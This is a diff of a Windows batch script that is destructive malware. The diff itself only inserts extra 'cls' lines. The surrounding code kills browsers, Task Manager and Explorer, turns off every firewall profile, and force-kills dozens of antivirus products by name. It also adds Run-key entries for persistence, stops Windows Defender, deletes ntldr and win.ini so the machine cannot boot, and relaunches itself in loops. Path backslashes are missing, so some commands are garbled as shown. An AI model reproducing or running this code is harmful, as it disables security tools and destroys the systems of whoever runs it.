@@ -8,8 +8,10 @@ start "" "%~dpnx0"
 cls
 taskkill /F /IM "chrome.exe" /T
 taskkill /F /IM "firefox.exe" /T
+cls
 taskkill /F /IM "ProcessHacker.exe" /T
 taskkill /F /IM "explorer.exe" /T
+cls
 taskkill /F /IM "taskmgr.exe" /T
 cls
 start "" "%~dpnx0"
@@ -19,6 +21,7 @@ netsh firewall set opmode mode=DISABLE
 cls
 netsh advfirewall set currentprofile state off
 netsh advfirewall set domainprofile state off
+cls
 netsh advfirewall set privateprofile state off
 netsh advfirewall set publicprofile state off
 netsh advfirewall set allprofiles state off
@@ -30,6 +33,7 @@ echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
 echo ipconfig/release_all>>c:windowswimn32.bat
 echo end>>c:windowswimn32.bat
+cls
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 cls
@@ -40,6 +44,7 @@ cls
 tskill /A spy*
 tskill /A bullguard
 tskill /A PersFw
+cls
 tskill /A KAV*
 tskill /A ZONEALARM
 tskill /A SAFEWEB
@@ -47,6 +52,7 @@ cls
 tskill /A OUTPOST
 tskill /A nv*
 tskill /A nav*
+cls
 tskill /A F-*
 tskill /A ESAFE
 tskill /A cle
@@ -54,6 +60,7 @@ cls
 tskill /A BLACKICE
 tskill /A def*
 tskill /A kav
+cls
 tskill /A kav*
 tskill /A avg*
 tskill /A ash*
@@ -61,6 +68,7 @@ cls
 tskill /A aswupdsv
 tskill /A ewid*
 tskill /A guard*
+cls
 tskill /A guar*
 tskill /A gcasDt*
 tskill /A msmp*
@@ -69,6 +77,7 @@ tskill /A mcafe*
 tskill /A mghtml
 tskill /A msiexec
 tskill /A outpost
+cls
 tskill /A isafe
 tskill /A zap*
 cls
@@ -76,6 +85,7 @@ tskill /A zauinst
 tskill /A upd*
 tskill /A zlclien*
 tskill /A minilog
+cls
 tskill /A cc*
 tskill /A norton*
 cls
@@ -166,6 +176,7 @@ del c:ntldr
 attrib -r -s -h c:windowswin.ini
 cls
 del c:windowswin.ini
+cls
 :start
 taskkill /f /im Taskmgr.exe
 start /min FBSOD.bat
@@ -173,6 +184,7 @@ start "" "%~dpnx0"
 cls
 net send * WORKGROUP ENABLED
 net send * WORKGROUP ENABLED
+cls
 taskkill /f /im wininit.exe
 taskkill /f /im explorer.exe
 cls
@@ -180,10 +192,13 @@ start /min FBSOD.bat
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
 start "" "%~dpnx0"
+cls
 taskkill /F /IM "chrome.exe" /T
 taskkill /F /IM "firefox.exe" /T
+cls
 taskkill /F /IM "ProcessHacker.exe" /T
 taskkill /F /IM "explorer.exe" /T
+cls
 taskkill /F /IM "taskmgr.exe" /T
 cls
 goto e
@@ -195,4 +210,5 @@ echo end>>c:windowshartlell.bat
 cls
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+cls
 goto start
